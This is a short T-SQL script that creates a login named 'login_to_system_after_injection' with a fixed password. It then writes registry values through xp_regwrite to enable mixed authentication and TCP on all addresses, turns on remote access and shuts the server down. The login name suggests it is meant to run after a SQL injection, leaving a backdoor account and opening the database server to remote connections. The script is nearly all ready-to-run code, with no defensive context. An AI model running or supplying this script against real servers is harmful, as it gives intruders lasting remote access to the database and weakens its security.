--step 1: creating a login (mandatory)
create login login_to_system_after_injection with password='Thank$SQL4Registry@ccess';
GO
--step 2: enabling both windows/SQL Authentication mode
/*some server specific configurations are not stored in system (SQL)*/
--set the value to 1 for disabling the SQL Authentication Mode after . . .
exec xp_regwrite N'HKEY_LOCAL_MACHINE', N'Software\Microsoft\MSSQLServer\MSSQLServer', N'LoginMode', REG_DWORD, 2;
--step 3:getting the server instance name
declare @spath nvarchar(256);
--SQL SERVER V100 path, use SQL9 for V90
exec master..xp_regread N'HKEY_LOCAL_MACHINE',
                 N'Software\Microsoft\Microsoft SQL Server\Instance Names\SQL' ,N'SQL10',@spath output,no_output 
--step 4:preparing registry path
declare @insRegPath nvarchar(1024)=N'Software\Microsoft\Microsoft SQL Server\' + 
                                      @spath + '\MSSQLServer\SuperSocketNetLib\Tcp';
--step 5:enabling tcp protocol'
exec xp_regwrite N'HKEY_LOCAL_MACHINE', @insRegPath, N'Enabled', REG_DWORD, 1 --generally tries to enable all addresses. NOT Recommended
--step 6:enabling remote access
EXEC sys.sp_configure N'remote access', 1
GO
RECONFIGURE WITH OVERRIDE --reconfigure is required!
GO
--step 7:a system restart is required in order to enabling remote access.
--step 7.1:shutting down the server
shutdown
--After this command you need to start the server implicitly yourself.
--or just configure the Agent in order to start the server at any shutdown or failure